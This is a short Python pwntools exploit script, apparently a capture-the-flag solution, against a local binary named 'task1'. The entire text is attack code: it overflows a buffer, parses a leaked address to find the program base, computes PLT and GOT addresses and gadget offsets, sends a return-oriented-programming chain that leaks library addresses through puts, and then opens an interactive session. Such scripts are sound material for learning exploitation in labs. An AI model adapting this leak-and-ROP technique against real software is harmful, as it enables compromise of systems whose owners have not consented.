from pwn import *


p = process("./task1")
payload = "A"*57 + "xx"
p.sendline("read")
p.sendline(payload)
pause()
p.sendline("gomugomunomi")
p.recvuntil("right ? : ")
leak = int("0x" + p.recvline(),16)
binaire = leak - 0x13d9
puts_plt = binaire + 0x1070
puts_got = binaire + 0x401c
printf_plt = binaire + 0x1050
printf_got = binaire + 0x4014
#Gadgets
movedx = binaire + 0x11f5
popedi = binaire + 0x156a
popebx = binaire + 0x101e
#Logs
log.info("Leak = "+hex(leak))
log.info("base binaire = "+hex(binaire))
log.info("puts @GOT = "+hex(puts_got))
log.info("puts @PLT  = "+hex(puts_plt))
payload = ""
payload += cyclic(80)
payload += p32(popedi)
payload += p32(printf_got)
payload += p32(printf_got)
payload += p32(popebx)
payload += p32(puts_got-0x1c)
payload += p32(puts_plt)
payload += p32(leak)
p.sendline(payload)
p.interactive()
